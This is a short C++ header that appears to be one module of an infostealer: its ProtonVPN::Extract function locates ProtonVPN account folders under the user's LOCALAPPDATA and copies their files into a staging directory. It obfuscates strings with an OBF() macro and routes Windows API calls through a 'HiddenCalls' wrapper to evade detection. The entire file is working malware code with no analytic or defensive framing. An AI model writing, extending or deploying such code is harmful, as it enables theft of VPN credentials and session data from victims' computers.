#ifndef PROTONVPN_HPP
#define PROTONVPN_HPP

#include <string>
#include <filesystem>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace ProtonVPN {
    inline void Extract(const std::string& baseDir) {
        std::string protonvpnFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("ProtonVPN");
        if (!fs::exists(protonvpnFolder)) {
            return;
        }

        std::string protonvpnAccount = baseDir + "\\" + OBF("ProtonVPN");
        HiddenCalls::CreateDirectoryA(protonvpnAccount.c_str(), NULL);

        for (const auto& entry : fs::directory_iterator(protonvpnFolder)) {
            std::string folderName = entry.path().filename().string();
            if (folderName.rfind(OBF("ProtonVPN_Url_"), 0) == 0) {
                std::string destPath = protonvpnAccount + "\\" + folderName;
                HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);
                for (const auto& file : fs::recursive_directory_iterator(entry.path())) {
                    std::string fileDest = destPath + "\\" + file.path().filename().string();
                    HiddenCalls::CopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
                }
            }
        }
    }
}

#endif
